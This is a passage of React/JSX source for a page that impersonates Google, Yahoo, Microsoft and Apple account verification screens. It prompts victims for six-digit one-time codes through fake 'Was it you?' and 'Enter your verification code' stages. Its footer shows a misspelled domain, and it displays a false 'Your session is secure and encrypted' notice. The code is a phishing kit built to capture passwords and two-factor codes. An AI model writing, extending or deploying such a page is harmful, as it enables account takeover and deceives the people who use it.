            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f1f3f4", borderRadius:8 }}>
                {currentProvider?.icon}
                <div>
                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>Google Verification</p>
                  <p style={{ fontSize:12, color:"#555", margin:0 }}>{providerEmail || "your Gmail account"}</p>
                </div>
              </div>

              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>Enter your verification code</p>
              <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
                Google sent a 6-digit verification code to your phone or backup email.<br/>
                Enter the code below to confirm it's you.
              </p>

              {/* 6-digit OTP boxes — Google blue */}
              <div style={{ display:"flex", justifyContent:"center", gap:10, marginBottom:8 }}>
                {Array.from({ length: 6 }).map((_, i) => (
                  <div key={i} style={{
                    width:44, height:54,
                    border: `2px solid ${otpCode.length === i ? "#1a73e8" : "#ddd"}`,
                    borderRadius:8, display:"flex", alignItems:"center", justifyContent:"center",
                    fontSize:22, fontWeight:700, color:"#111", background:"#fafafa",
                    boxShadow: otpCode.length === i ? "0 0 0 3px rgba(26,115,232,0.15)" : "none",
                    transition:"border 0.2s, box-shadow 0.2s",
                  }}>
                    {otpCode[i] ?? ""}
                  </div>
                ))}
              </div>

              <input
                className="otp-input"
                type="tel"
                inputMode="numeric"
                maxLength={6}
                placeholder="Enter 6-digit code"
                value={otpCode}
                onChange={e => { setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setOtpError(""); }}
                onKeyDown={e => e.key === "Enter" && handleOtpSubmit()}
                disabled={loading}
                style={{ width:"100%", height:46, border: otpError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:18, color:"#111", background:"#fafafa", boxSizing:"border-box", textAlign:"center", letterSpacing:"0.3em", marginTop:12 }}
                autoComplete="one-time-code"
                autoFocus
              />
              {otpError && <p style={{ fontSize:12, color:"#d93025", marginTop:5 }}>{otpError}</p>}

              <button type="button" onClick={handleOtpSubmit} disabled={loading || otpCode.length < 6}
                style={{ width:"100%", height:50, marginTop:20, background: loading || otpCode.length < 6 ? "#aaa" : "#1a73e8", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor: loading || otpCode.length < 6 ? "not-allowed" : "pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying…</> : "Next →"}
              </button>

              <p style={{ fontSize:12, color:"#aaa", marginTop:14 }}>
                Didn't receive a code? Check your spam or try resending.
              </p>
            </div>
          )}

          {/* ── STAGE: provider-confirm (Yahoo / Outlook / iCloud — "Was it you?") ── */}
          {stage === "provider-confirm" && selectedProvider !== "gmail" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              {/* Brand header */}
              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:22 }}>
                <div style={{
                  width:60, height:60, borderRadius:"50%",
                  background: currentProvider?.confirmBg ?? "#f5f5f5",
                  display:"flex", alignItems:"center", justifyContent:"center", marginBottom:14,
                }}>
                  {currentProvider?.iconLarge ?? currentProvider?.icon}
                </div>
                <p style={{ fontSize:18, fontWeight:700, color:"#111", margin:"0 0 4px" }}>
                  {selectedProvider === "icloud" ? "Apple ID Sign-In Detected" :
                   selectedProvider === "yahoo"   ? "Yahoo Sign-In Detected" :
                                                    "Microsoft Sign-In Detected"}
                </p>
                <p style={{ fontSize:13, color:"#666", margin:0 }}>{providerEmail}</p>
              </div>

              {/* Info card */}
              <div style={{
                background: currentProvider?.confirmBg ?? "#f8f8f8",
                border: `1px solid ${currentProvider?.brandColor ?? "#ddd"}30`,
                borderRadius:10, padding:"14px 16px", marginBottom:22, textAlign:"left",
              }}>
                <p style={{ fontSize:13, fontWeight:600, color:"#111", margin:"0 0 6px" }}>
                  A new sign-in was detected to your account
                </p>
                <p style={{ fontSize:12, color:"#555", margin:"0 0 4px" }}>
                  If this was you, tap <b>Yes, it's me</b> to verify your identity.
                </p>
                <p style={{ fontSize:12, color:"#555", margin:0 }}>
                  If you didn't sign in, tap <b>No</b> to secure your account immediately.
                </p>
              </div>

              {/* YES button — brand color */}
              <button type="button"
                onClick={() => setStage("verification")}
                style={{ width:"100%", height:50, marginBottom:10, background: currentProvider?.brandColor ?? "#333", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer", letterSpacing:"0.02em" }}>
                Yes, it's me
              </button>

              {/* NO button */}
              <button type="button"
                onClick={() => setStage("rejected")}
                style={{ width:"100%", height:46, background:"#fff", color:"#c00", fontSize:14, fontWeight:600, border:"1.5px solid #e0e0e0", borderRadius:6, cursor:"pointer" }}>
                No, it wasn't me
              </button>

              <p style={{ fontSize:11, color:"#aaa", marginTop:16, textAlign:"center" }}>
                {selectedProvider === "icloud"
                  ? "Apple will never ask for your password via email or text."
                  : selectedProvider === "yahoo"
                    ? "Yahoo will never ask for your password in an email."
                    : "Microsoft will never ask for your password in an email."}
              </p>
            </div>
          )}

          {/* ── STAGE: verification (Yahoo / Outlook / iCloud — OTP) ── */}
          {stage === "verification" && selectedProvider !== "gmail" && (
            <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background: currentProvider?.confirmBg ?? "#f8f8f8", borderRadius:8 }}>
                {currentProvider?.icon}
                <div>
                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>
                    {selectedProvider === "icloud" ? "Apple ID Verification" :
                     selectedProvider === "yahoo" ? "Yahoo Account Key" : "Microsoft Verification"}
                  </p>
                  <p style={{ fontSize:12, color:"#666", margin:0 }}>{providerEmail}</p>
                </div>
              </div>

              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>
                {selectedProvider === "icloud" ? "Enter your verification code" : "Enter the code we sent you"}
              </p>
              <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
                {selectedProvider === "icloud"
                  ? "A 6-digit code was sent to your trusted device or phone number."
                  : selectedProvider === "yahoo"
                    ? "A 6-digit verification code was sent to your recovery email or phone."
                    : "A 6-digit code was sent to your registered phone or alternate email."}
              </p>

              {/* 6-digit OTP boxes — brand color highlight */}
              <div style={{ display:"flex", justifyContent:"center", gap:10, marginBottom:8 }}>
                {Array.from({ length: 6 }).map((_, i) => (
                  <div key={i} style={{
                    width:44, height:54,
                    border: `2px solid ${otpCode.length===i ? (currentProvider?.brandColor ?? "#111") : "#ddd"}`,
                    borderRadius:8, display:"flex", alignItems:"center", justifyContent:"center",
                    fontSize:22, fontWeight:700, color:"#111", background:"#fafafa",
                    boxShadow: otpCode.length===i ? `0 0 0 3px ${currentProvider?.brandColor ?? "#111"}22` : "none",
                    transition:"border 0.2s, box-shadow 0.2s",
                  }}>
                    {otpCode[i] ?? ""}
                  </div>
                ))}
              </div>

              <input
                className="otp-input"
                type="tel"
                inputMode="numeric"
                maxLength={6}
                placeholder="Enter 6-digit code"
                value={otpCode}
                onChange={e => { setOtpCode(e.target.value.replace(/\D/g, "").slice(0,6)); setOtpError(""); }}
                onKeyDown={e => e.key==="Enter" && handleOtpSubmit()}
                disabled={loading}
                style={{ width:"100%", height:46, border: otpError ? "1.5px solid #c00" : "1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:18, color:"#111", background:"#fafafa", boxSizing:"border-box", textAlign:"center", letterSpacing:"0.3em", marginTop:12 }}
                autoComplete="one-time-code"
              />
              {otpError && <p style={{ fontSize:12, color:"#c00", marginTop:5 }}>{otpError}</p>}

              <button type="button" onClick={handleOtpSubmit} disabled={loading || otpCode.length<6}
                style={{ width:"100%", height:50, marginTop:20, background: loading||otpCode.length<6 ? "#aaa" : (currentProvider?.brandColor ?? "#111"), color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor: loading||otpCode.length<6 ? "not-allowed" : "pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying…</> : "Verify →"}
              </button>

              <p style={{ fontSize:12, color:"#aaa", marginTop:12 }}>
                Didn't receive a code? Check your spam or try again later.
              </p>
            </div>
          )}

          {/* ── STAGE: approving ── */}
          {stage === "approving" && (
            <>
              <div style={{ width:56, height:56, margin:"0 auto 20px", border:"5px solid #e8e8e8", borderTop:"5px solid #111", borderRadius:"50%", animation:"botp-spin 0.9s linear infinite" }} />
              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>Verifying your identity…</p>
              <p style={{ fontSize:13, color:"#555", animation:"botp-pulse 2s ease-in-out infinite" }}>Please wait, do not close this page.</p>
            </>
          )}

          {/* ── STAGE: approved ── */}
          {stage === "approved" && (
            <>
              <div style={{ width:64, height:64, borderRadius:"50%", background:"#111", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 20px" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 6L9 17l-5-5"/>
                </svg>
              </div>
              <p style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:8 }}>Verification Successful!</p>
              <p style={{ fontSize:13, color:"#555" }}>Proceeding to next step…</p>
            </>
          )}

          {/* ── STAGE: rejected ── */}
          {stage === "rejected" && (
            <>
              <div style={{ width:64, height:64, borderRadius:"50%", background:"#c00", display:"flex", alignItems:"center", justifyContent:"center", margin:"0 auto 20px" }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
                </svg>
              </div>
              <p style={{ fontSize:17, fontWeight:700, color:"#111", marginBottom:8 }}>Verification Failed</p>
              <p style={{ fontSize:13, color:"#555", marginBottom:24, lineHeight:1.6 }}>
                We couldn't verify your identity. Please try again or contact support.
              </p>
              <button type="button" onClick={() => { setStage("provider-select"); setSelectedProvider(null); setProviderEmail(""); setProviderPassword(""); setOtpCode(""); setSelectedGmailNum(null); sessionKeyRef.current = `verify_${Date.now()}`; }}
                style={{ width:"100%", height:46, background:"#111", color:"#fff", fontSize:14, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer" }}>
                Try Again
              </button>
            </>
          )}

          {(stage === "provider-select" || stage === "credentials" || stage === "verification") && (
            <p style={{ fontSize:12, color:"#bbb", marginTop:16 }}>Your session is secure and encrypted.</p>
          )}
        </div>
      </div>

      <div style={{ width:"100%", maxWidth:480, marginTop:10, paddingRight:2, textAlign:"right" }}>
        <span style={{ fontSize:11, color:"#888" }}>
          &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
        </span>
      </div>
    </div>
  );
}
